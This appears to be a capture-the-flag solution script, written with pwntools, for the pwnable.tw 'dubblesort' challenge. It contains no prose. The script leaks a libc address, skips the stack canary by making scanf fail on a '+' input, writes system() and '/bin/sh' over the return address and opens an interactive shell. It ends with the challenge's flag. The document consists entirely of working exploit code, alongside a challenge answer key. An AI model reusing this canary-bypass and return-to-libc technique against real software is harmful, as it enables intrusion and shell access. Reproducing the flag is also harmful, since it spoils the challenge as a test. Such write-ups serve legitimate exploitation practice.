from pwn import *

libc = ELF('libc_32.so.6')
elf = ELF("dubblesort")

p = remote("chall.pwnable.tw", 10101)

with log.progress('Leaking libc base address') as l:
    padding = 'AAAA' * 7
    p.sendafter(':', padding + 'A')

    p.recvuntil(padding)

    libc_base = (u32(p.recv(4)) & 0xfffff000) - 0x1ae000

    l.success(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

TOTAL = 8 + 16 + 1 + 7 + 1 + 2

with log.progress('Overwriting ret-addr with system (0x%x)' % system) as l:
    p.sendlineafter('sort :', str(TOTAL))

    for _ in range(8 + 16):
        l.status('%2i/24' % (_ + 1))
        p.sendlineafter('number : ', str(0))

    # Let ``scanf("%u", ...)`` fail so the canary is left unchanged
    p.sendlineafter('number : ', '+')

    for _ in range(7):
        l.status('%2i/7' % (_ + 1))
        p.sendlineafter('number : ', str(libc_base))

    p.sendlineafter('number : ', str(system))

    p.sendlineafter('number : ', str(system + 0x123))
    p.sendlineafter('number : ', str(binsh))

    l.success()

# Let the program sort the payload
p.recvuntil('%d ' % binsh)

p.interactive()

# FLAG --> FLAG{Dubo_duBo_dub0_s0rttttttt}
